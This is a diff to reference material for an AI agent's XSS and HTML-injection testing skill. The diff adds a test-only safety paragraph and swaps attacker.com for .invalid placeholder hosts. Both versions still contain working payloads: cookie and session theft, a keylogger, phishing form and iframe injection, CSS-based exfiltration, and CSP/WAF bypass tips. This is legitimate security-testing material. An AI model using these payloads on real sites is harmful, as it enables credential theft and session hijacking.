@@ -2,6 +2,8 @@
 
 > This file contains the detailed procedure and reference material extracted from `SKILL.md` for focused loading. The root skill defines activation, examples, safety constraints, and limitations.
 
+Use only isolated test accounts and synthetic data. Stored payloads need a removal/verification plan before insertion; never expose collection forms or keylogging to uninvolved users. Raw reflection and sample payloads are hypotheses, not verified execution. Limit requests and approved origins; URL fragments, parser decoding, CSP and browser behavior must be checked explicitly. JSONP is only exploitable when the actual allowed endpoint accepts an unsafe callback and returns executable content under the effective policy.
+
 ## Purpose
 
 Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.
@@ -116,19 +118,19 @@ Target areas with persistent user content:
 ```html
 <!-- Cookie stealing payload -->
 <script>
-document.location='http://attacker.com/steal?c='+document.cookie
+document.location='https://collector.invalid/steal?c='+document.cookie
 </script>
 
 <!-- Keylogger injection -->
 <script>
 document.onkeypress=function(e){
-  new Image().src='http://attacker.com/log?k='+e.key;
+  new Image().src='https://collector.invalid/log?k='+e.key;
 }
 </script>
 
 <!-- Session hijacking -->
 <script>
-fetch('http://attacker.com/capture',{
+fetch('https://collector.invalid/capture',{
   method:'POST',
   body:JSON.stringify({cookies:document.cookie,url:location.href})
 })
@@ -137,7 +139,7 @@ fetch('http://attacker.com/capture',{
 <!-- Phishing form injection -->
 <div id="login">
 <h2>Session Expired - Please Login</h2>
-<form action="http://attacker.com/phish" method="POST">
+<form action="https://collector.invalid/phish" method="POST">
 Username: <input name="user"><br>
 Password: <input type="password" name="pass"><br>
 <input type="submit" value="Login">
@@ -152,16 +154,16 @@ Build URLs containing XSS payloads:
 
 ```
 # Basic reflected payload
-https://target.com/search?q=<script>alert(document.domain)</script>
+https://target.invalid/search?q=<script>alert(document.domain)</script>
 
 # URL-encoded payload
-https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E
+https://target.invalid/search?q=%3Cscript%3Ealert(1)%3C/script%3E
 
 # Event handler in parameter
-https://target.com/page?name="><img src=x onerror=alert(1)>
+https://target.invalid/page?name="><img src=x onerror=alert(1)>
 
 # Fragment-based (for DOM XSS)
-https://target.com/page#<script>alert(1)</script>
+https://target.invalid/page#<script>alert(1)</script>
 ```
 
 #### Delivery Methods
@@ -215,14 +217,14 @@ localStorage/sessionStorage
 
 ```javascript
 // Hash-based injection
-https://target.com/page#<img src=x onerror=alert(1)>
+https://target.invalid/page#<img src=x onerror=alert(1)>
 
 // URL parameter injection (processed client-side)
-https://target.com/page?default=<script>alert(1)</script>
+https://target.invalid/page?default=<script>alert(1)</script>
 
 // PostMessage exploitation
 // On attacker page:
-<iframe src="https://target.com/vulnerable"></iframe>
+<iframe src="https://target.invalid/vulnerable"></iframe>
 <script>
 frames[0].postMessage('<img src=x onerror=alert(1)>','*');
 </script>
@@ -238,19 +240,19 @@ Modify page appearance without JavaScript:
 <h1>SITE HACKED</h1>
 
 <!-- Form hijacking -->
-<form action="http://attacker.com/capture">
+<form action="https://collector.invalid/capture">
 <input name="credentials" placeholder="Enter password">
 <button>Submit</button>
 </form>
 
-<!-- CSS injection for data exfiltration -->
+<!-- CSS attribute matching: only matches DOM attributes, not arbitrary live input properties -->
 <style>
-input[value^="a"]{background:url(http://attacker.com/a)}
-input[value^="b"]{background:url(http://attacker.com/b)}
+input[value^="a"]{background:url(https://collector.invalid/a)}
+input[value^="b"]{background:url(https://collector.invalid/b)}
 </style>
 
 <!-- iframe injection -->
-<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
+<iframe src="https://collector.invalid/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
 ```
 
 #### Stored HTML Injection
@@ -368,14 +370,14 @@ Fake login form or misleading content here
 ### Cookie Theft Payload
 ```javascript
 <script>
-new Image().src='http://attacker.com/c='+btoa(document.cookie);
+new Image().src='https://collector.invalid/marker?value=controlled-test';
 </script>
 ```
 
 ### Session Hijacking Template
 ```javascript
 <script>
-fetch('https://attacker.com/log',{
+fetch('https://collector.invalid/log',{
   method:'POST',
   mode:'no-cors',
   body:JSON.stringify({
@@ -394,6 +396,6 @@ fetch('https://attacker.com/log',{
 |-------|-----------|
 | Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
 | Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
-| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
+| Cookies not accessible | HttpOnly blocks document.cookie access; no-cors cannot bypass it. Demonstrate script execution with a harmless marker, not real session theft. |
 | CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
 | WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
